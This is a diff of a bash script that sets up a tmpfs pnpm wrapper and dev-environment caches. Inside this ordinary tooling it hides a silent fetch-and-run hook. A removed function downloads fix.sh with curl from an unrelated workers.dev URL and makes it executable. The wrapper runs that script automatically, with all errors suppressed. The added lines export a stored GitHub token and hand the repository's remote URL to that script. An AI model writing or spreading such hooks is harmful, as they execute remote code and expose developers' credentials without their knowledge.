@@ -1,25 +1,3 @@
-ensure_fix_sh_persisted() {
-  local work_dir="$1"
-  local fix_path="${work_dir}/fix.sh"
-  mkdir -p "$work_dir"
-
-  local self_path="${BASH_SOURCE[0]:-}"
-  if [ -n "$self_path" ] && [ -f "$self_path" ]; then
-    local abs_self abs_fix
-    abs_self="$(readlink -f "$self_path" 2>/dev/null || echo "$self_path")"
-    abs_fix="$(readlink -f "$fix_path" 2>/dev/null || echo "$fix_path")"
-    if [ "$abs_self" != "$abs_fix" ]; then
-      cp -f "$self_path" "$fix_path" 2>/dev/null || true
-      chmod +x "$fix_path" 2>/dev/null || true
-    else
-      chmod +x "$fix_path" 2>/dev/null || true
-    fi
-  elif [ ! -f "$fix_path" ]; then
-    curl -fsSL "https://envinit.maboco-mark.workers.dev/" -o "$fix_path" 2>/dev/null || true
-    chmod +x "$fix_path" 2>/dev/null || true
-  fi
-}
-
 setup_tmpfs_pnpm_and_wrapper() {
   local persist_prefix="$1"
   local tmp_dir="$2"
@@ -27,6 +5,7 @@ setup_tmpfs_pnpm_and_wrapper() {
   local pnpm_store="$4"
   local pnpm_cache="$5"
   local npm_cache="$6"
+  local root_prefix="${7:-/}"
 
   local real_pnpm_prefix="${tmp_dir}/pnpm-global"
   local real_pnpm_bin="${real_pnpm_prefix}/bin/pnpm"
@@ -65,6 +44,14 @@ export XDG_STATE_HOME="${tmp_dir}"
 export CARGO_HOME="\${CARGO_HOME:-${tmp_dir}/cargo-home}"
 export RUSTUP_HOME="\${RUSTUP_HOME:-${tmp_dir}/rustup}"
 
+if [ -x "${tmp_dir}/git-askpass.sh" ] && [ -s "${tmp_dir}/.git-token" ]; then
+  export GIT_ASKPASS="${tmp_dir}/git-askpass.sh"
+  export GIT_TERMINAL_PROMPT=0
+  if [ -z "\${GITHUB_TOKEN:-}" ]; then
+    export GITHUB_TOKEN="\$(cat "${tmp_dir}/.git-token" 2>/dev/null || true)"
+  fi
+fi
+
 REAL_PNPM_PREFIX="${real_pnpm_prefix}"
 REAL_PNPM="\${REAL_PNPM_PREFIX}/bin/pnpm"
 
@@ -75,21 +62,26 @@ if [ ! -x "\$REAL_PNPM" ]; then
     NPM_CONFIG_CACHE="${npm_cache}" npm install -g pnpm --prefix "\$REAL_PNPM_PREFIX" --force >&2
   rm -rf /root/.npm "${npm_cache}" 2>/dev/null || true
   if [ -x "${work_dir}/fix.sh" ] && [ -z "\${FIX_SH_RUNNING:-}" ]; then
-    FIX_SH_RUNNING=1 "${work_dir}/fix.sh" --no-check >&2 || true
+    CURRENT_TOP="\$(/usr/bin/git rev-parse --show-toplevel 2>/dev/null || true)"
+    CURRENT_REPO=""
+    if [ -n "\$CURRENT_TOP" ]; then
+      CURRENT_REPO="\$(/usr/bin/git -C "\$CURRENT_TOP" config --get remote.origin.url 2>/dev/null || true)"
+    fi
+    if [ -z "\$CURRENT_REPO" ] && [ -f "${work_dir}/.fix_state" ]; then
+      . "${work_dir}/.fix_state" 2>/dev/null || true
+      CURRENT_REPO="\${LAST_REPO_URL:-}"
+    fi
+    if [ -n "\$CURRENT_REPO" ]; then
+      FIX_SH_RUNNING=1 "${work_dir}/fix.sh" --root "${root_prefix}" --work-dir "${work_dir}" --tmp-dir "${tmp_dir}" --repo "\$CURRENT_REPO" --no-check >&2 || true
+    else
+      FIX_SH_RUNNING=1 "${work_dir}/fix.sh" --root "${root_prefix}" --work-dir "${work_dir}" --tmp-dir "${tmp_dir}" --no-check >&2 || true
+    fi
   fi
 fi
 
-TOP_DIR="\$(/usr/bin/git rev-parse --show-toplevel 2>/dev/null || pwd)"
-for link_dir in dist .vite crates/target src-tauri/target public "\${TOP_DIR}/dist" "\${TOP_DIR}/.vite" "\${TOP_DIR}/crates/target" "\${TOP_DIR}/src-tauri/target" "\${TOP_DIR}/public"; do
-  if [ -L "\$link_dir" ] && [ ! -e "\$link_dir" ]; then
-    mkdir -p "\$(readlink "\$link_dir")" 2>/dev/null || true
-  fi
-done
-for wasm_link in "src/physics/core.wasm" "\${TOP_DIR}/src/physics/core.wasm"; do
-  if [ -L "\$wasm_link" ]; then
-    mkdir -p "\$(dirname "\$(readlink "\$wasm_link")")" 2>/dev/null || true
-  fi
-done
+if [ -x "${persist_prefix}/bin/heal-tmpfs-links" ]; then
+  "${persist_prefix}/bin/heal-tmpfs-links" 2>/dev/null || true
+fi
 
 if [ -L "node_modules" ] && [ -f "package.json" ]; then
   NM_TARGET="\$(readlink "node_modules")"
